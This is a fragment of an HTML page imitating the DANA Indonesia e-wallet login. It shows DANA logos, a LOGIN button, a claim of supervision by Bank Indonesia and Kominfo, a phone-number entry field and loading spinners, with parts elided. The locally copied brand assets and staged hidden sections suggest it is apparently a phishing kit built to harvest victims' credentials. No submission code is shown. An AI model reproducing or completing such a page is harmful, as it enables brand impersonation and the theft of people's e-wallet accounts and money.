    ...
    <head>
        ...
        <body>
            <div style="display:none;" class="index">
                <div class="header">
<img src="ast/img/dana logo.png" class="logo" alt="">
                    </div>
    <div class="content">
    <div class="hero">
    ...
    <button type="button" onclick="next();">LOGIN</button></div></div>
    <div class="start" style="display:none;">
    <img class="logo" src="ast/img/dana text.png">
    <div class="footimg">
    <img src="ast/img/bi.png" alt="">
    <img src="ast/img/kom.png" alt="">
    <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p></div></div>
    <div class="container hid"><div class="box-login">
    <div id="process" name="process" class="process" style="display: none;">
    <div class="loading">
    <img src="ast/img/load bg.png">
    <img class="spinner" src="ast/img/load spin.png"></div></div>
    <div class="header">
 <img src="ast/img/dana logo.png" class="logo" alt="">
    </div>
 ...
 <h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
    ...
    <label style="font-size:21px;">+62</label></div>
    <input style="font-size:21px;" id="inp" type="tel" autocomplete="off" required name="phoneNumber" placeholder="811-1234-5678">
    </div>
    ...
    <img src="ast/img/load bg.png">
    <img class="spinner" src="ast/img/load spin.png">
    </div>
